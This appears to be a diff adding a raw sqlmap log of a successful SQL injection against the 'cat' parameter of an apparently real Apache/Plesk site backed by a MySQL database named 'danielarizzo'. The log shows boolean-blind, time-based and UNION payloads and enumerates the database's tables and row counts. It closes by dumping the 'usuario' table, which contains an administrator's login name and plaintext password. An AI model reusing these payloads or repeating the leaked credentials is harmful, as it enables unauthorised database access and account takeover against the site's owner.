@@ -1,0 +1,100 @@
+sqlmap identified the following injection point(s) with a total of 55 HTTP(s) requests:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=13 AND 5321=5321
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cat=13 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: cat=13 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b717871,0x69746863456d4b7472476c6946636f416a7a4c496b57637269784970536e4665794d794352597470,0x7171717a71)-- nwtY
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web server operating system: Linux
+web application technology: Apache, Plesk
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] danielarizzo
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=13 AND 5321=5321
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cat=13 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: cat=13 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b717871,0x69746863456d4b7472476c6946636f416a7a4c496b57637269784970536e4665794d794352597470,0x7171717a71)-- nwtY
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web server operating system: Linux
+web application technology: Apache, Plesk
+back-end DBMS: MySQL >= 5.0.12
+Database: danielarizzo
+[7 tables]
++------------+
+| banner     |
+| categoria  |
+| depoimento |
+| empresa    |
+| foto       |
+| portfolio  |
+| usuario    |
++------------+
+
+Database: danielarizzo
++-----------+---------+
+| Table     | Entries |
++-----------+---------+
+| foto      | 560     |
+| portfolio | 54      |
+| banner    | 7       |
+| categoria | 4       |
+| empresa   | 1       |
+| usuario   | 1       |
++-----------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cat (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cat=13 AND 5321=5321
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cat=13 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 4 columns
+    Payload: cat=13 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b717871,0x69746863456d4b7472476c6946636f416a7a4c496b57637269784970536e4665794d794352597470,0x7171717a71)-- nwtY
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web server operating system: Linux
+web application technology: Apache, Plesk
+back-end DBMS: MySQL >= 5.0.12
+Database: danielarizzo
+Table: usuario
+[1 entry]
++--------------+--------------+--------------+------------+
+| usu_nome     | usu_login    | usu_senha    | usu_codigo |
++--------------+--------------+--------------+------------+
+| Administador | rizzoeventos | R1zzo&v&ntos | 1          |
++--------------+--------------+--------------+------------+
+
